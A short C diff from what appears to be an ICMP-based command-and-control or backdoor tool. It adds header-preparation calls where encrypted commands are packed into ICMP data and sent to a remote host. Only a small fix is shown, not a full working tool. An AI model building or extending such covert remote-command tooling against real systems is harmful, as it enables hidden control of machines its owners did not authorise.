@@ -95,6 +95,8 @@ void interact(int sockfd) {
 
             print_connection_succeed(src_ip);
 
+            prep_icmp_headers(icmp, 0);
+
             addr = prep_ip_headers(ip);
 
             nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr), 0, (struct sockaddr *) &addr, sizeof(addr));
@@ -111,6 +113,8 @@ void interact(int sockfd) {
         command = get_command(input);
 
         append_to_data_section(icmp, command);
+
+        prep_icmp_headers(icmp, strlen((char *) input));
 
         // we're using a stream cipher, and since length of input == cipher_text then we use strlen(input) instead
         nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + strlen(input), 0, (struct sockaddr *) &addr, sizeof(addr));
